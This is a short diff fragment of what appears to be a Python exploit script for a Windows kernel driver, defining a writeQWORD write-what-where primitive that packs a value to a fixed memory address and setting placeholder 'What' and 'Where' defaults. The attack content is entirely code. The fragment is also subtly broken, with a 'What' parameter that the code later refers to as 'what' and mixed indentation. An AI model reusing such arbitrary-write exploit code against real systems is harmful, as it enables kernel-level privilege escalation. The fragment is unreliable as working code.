@@ -26,7 +26,7 @@ if dwStatus != STATUS_SUCCESS:
 	print("Something went wrong while allocating memory","e")
 	sys.exit()
 
-def writeQWORD(Driver=None, What=None, Where=None):
+def writeQWORD(Driver=None, What=4141414141414141, Where=4242424242424242):
 	what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
   	# Write the what value to what_addr
 	data = struct.pack("<Q", what)
